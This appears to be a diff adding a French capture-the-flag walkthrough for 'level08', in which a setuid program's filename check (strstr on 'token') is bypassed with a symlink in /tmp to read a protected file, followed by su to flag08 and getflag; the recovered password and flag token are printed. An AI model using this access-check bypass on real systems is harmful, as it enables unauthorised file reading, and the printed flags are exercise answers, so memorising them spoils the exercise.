@@ -1,0 +1,28 @@
+On lance le programme 
+./level08
+./level08 [file to read]
+
+On essaye donc de le lancer avec le fichier token
+./level08 token
+You may not access 'token'
+
+On essaye donc de faire un lien symbolique vers /tmp (endroit ou l'on possede les droits)
+ln -s /home/user/level08/token /tmp/token
+Puis on lance :
+./level08 /tmp/token
+You may not access '/tmp/token'
+
+On lance : strings level08
+On remarque la presence de strstr qui recherche la premiere occurance entre deux chaine de charactere
+On tente donc de changer le nom de token et de faire un lien symbolique 
+ln -s /home/user/level08/token /tmp/test
+./level08 /tmp/test
+quif5eloekouj29ke0vouxean
+
+je peux donc me connecter a flag08 avec la chaine de charactere ci dessus
+su flag08
+
+une fois connnecter je peux getflag : 
+getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
